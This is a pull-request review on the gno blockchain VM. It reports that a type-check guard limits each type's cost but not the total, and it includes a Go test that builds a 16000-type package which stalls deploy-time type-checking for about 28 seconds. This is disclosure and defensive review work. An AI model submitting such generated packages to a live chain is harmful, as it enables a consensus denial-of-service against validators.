# Review: PR [#5826](https://github.com/gnolang/gno/pull/5826)
Event: REQUEST_CHANGES

## Body
The three round-1 fan-out shapes now reject on the deploy path, but the per-type budget leaves the same unmetered validType stall reachable by aggregating many under-budget types. Reproduced on c1942b74c: a ~437KB package of 16000 types the guard accepts one by one takes ~28s in TypeCheckMemPackage, linear at ~1.7ms/type, all pure go/types CPU with no store reads to charge, so no gas covers it.

Full review: https://github.com/samouraiworld/gno-agent-workspace/blob/main/reviews/pr/5xxx/5826-typecheck-fanout-dos/2-c1942b74c/review_claude-opus-4-8_davd-gzl.md [↗](review_claude-opus-4-8_davd-gzl.md)

## gnovm/pkg/gnolang/typecheck_bound.go:291-298 [↗](../../../../../.worktrees/gno-review-5826/gnovm/pkg/gnolang/typecheck_bound.go#L291)
The budget caps each named type's validType cost but never the sum across types. go/types runs validType once per type with the golang/go#65711 cache disabled, so 16000 under-budget types in a ~437KB package the guard accepts stall the unmetered deploy type-check ~28s, the same consensus DoS reached by aggregation. Bound the total validType cost across the package, not only each type.

<details><summary>repro</summary>

A depth-13 doubling chain (T13 ≈ 57k nodes, under the 100k per-type budget) shared by k siblings, each referencing T13 once. Every type passes the guard; go/types re-walks T13 for each sibling.

```bash
# from a local clone of gnolang/gno:
gh pr checkout 5826 -R gnolang/gno
cat > gnovm/pkg/gnolang/zzz_aggregate_dos_test.go <<'EOF'
package gnolang

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"strings"
	"testing"
	"time"

	"github.com/gnolang/gno/tm2/pkg/std"
)

func aggregateDoSSrc(k int) string {
	var b strings.Builder
	b.WriteString("package sib\ntype T0 struct{ v int }\n")
	for i := 1; i <= 13; i++ {
		fmt.Fprintf(&b, "type T%d struct{ a, b [0]T%d }\n", i, i-1)
	}
	for i := 0; i < k; i++ {
		fmt.Fprintf(&b, "type S%d struct{ x T13 }\n", i)
	}
	return b.String()
}

func TestAggregateDoS(t *testing.T) {
	for _, k := range []int{1500, 16000} {
		src := aggregateDoSSrc(k)
		fset := token.NewFileSet()
		f, _ := parser.ParseFile(fset, "sib.go", src, parser.SkipObjectResolution)
		guard := checkTypeExpansionBound(fset, []*ast.File{f})
		mpkg := &std.MemPackage{
			Type:  MPUserProd,
			Name:  "sib",
			Path:  "gno.land/r/foobar/sib",
			Files: []*std.MemFile{{Name: "sib.gno", Body: src}},
		}
		start := time.Now()
		_, err := TypeCheckMemPackage(mpkg, TypeCheckOptions{
			Getter: mockPackageGetter{}, TestGetter: mockPackageGetter{}, Mode: TCLatestRelaxed,
		})
		t.Logf("k=%d bytes=%d guard=%v typecheck=%s typecheckErr=%v",
			k, len(src), guard, time.Since(start).Round(time.Millisecond), err != nil)
	}
}
EOF
go test -count=1 -v -run TestAggregateDoS ./gnovm/pkg/gnolang/
rm gnovm/pkg/gnolang/zzz_aggregate_dos_test.go
```

Observed on c1942b74c (guard accepts every size; type-check time is linear in the number of under-budget types):
```
k=1500 bytes=39810 guard=<nil> typecheck=2.618s typecheckErr=false
k=16000 bytes=437310 guard=<nil> typecheck=27.936s typecheckErr=false
--- PASS: TestAggregateDoS (30.57s)
```
</details>
